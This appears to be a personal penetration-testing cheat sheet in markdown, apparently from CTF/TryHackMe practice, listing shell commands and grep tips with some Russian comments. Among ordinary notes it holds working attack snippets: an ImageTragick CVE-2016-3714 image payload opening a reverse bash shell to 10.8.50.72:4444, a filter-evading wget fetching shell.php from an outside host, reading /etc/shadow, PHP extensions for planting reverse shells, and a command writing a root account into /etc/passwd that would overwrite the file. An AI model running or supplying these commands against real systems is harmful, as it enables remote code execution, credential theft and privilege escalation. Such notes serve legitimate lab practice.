[back](/README.md)

---
#### Spawn a fully interactive shell:
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

#### scan rpc port
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```

#### CVE-2016–3714

```
cat > image.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```


#### Read file:
```python
xxd -r file.txt 
base64 /etc/shadow | base64 -d
ltrace # is a debugging utility in Linux, used to display the calls a userspace application makes to shared libraries.
```
```
`l\s`: Equivalent to `ls`
`wget${IFS}http://10.8.50.72:8000/shell.php`
```

#### if command to long
```python
python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
```

#### Decompress a gzip file:
```sh
gzip -d file.gz
```
#### Change file without vim or nano
```sh
cat > file << EOF 
....
EOF
```

#### php extensions to run revsell
```
.php
.php3
.php4
.php5
.phtml
```

#### broken png image
```
xxd thm.jpg | head
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
```
#### NFS share
```
mkdir tmp/
sudo mount -t nfs 10.10.104.64: tmp
tree tmp
```

#### socat if open port
```python
./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
```

#### create new user in /etc/passwd with root

```
echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
```

#### fix PATH in old ubuntu
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

#### grep
```sh
locate seclist | grep <what>
grep -Rwi "text"
grep -n #numbers
grep -i #do not care abuot regex
grep -c #how many times
grep linux * -r recursive # in all files
точка - это любой символ, -f чтоб точка не считалась любым символом
-v '^#' #begins with
'^$' #пустые строки
-e '^(#|$)' #начинается или с # или с $(пустая строка)
grep -e 'colou?r' # ? makes preveous character optional (то есть и может стоять и нет)
grep -w 'root' # only word root, not asdrootas
\grep #unalias
-A5 #five line after the math
-B5 #before
-C5 #before and after
-e '[0-9]{5,6}/tcp' file.txt #от 5 до 6 цифр от 0 до 9
-E '[0-9]$' #number at the end of line
-E '\s*' # space or tab 
+ # one and more chars
```

---
#### ssh
```
ssh-keygen -t rsa -q -f "$HOME/.ssh/id_rsa" -N ""
```
#### [steal admin cookie/sqli](/other/src/marketplace.md) (tryhackme:marketplace)
#### [ohmyweb](./src/omyweb.md)

---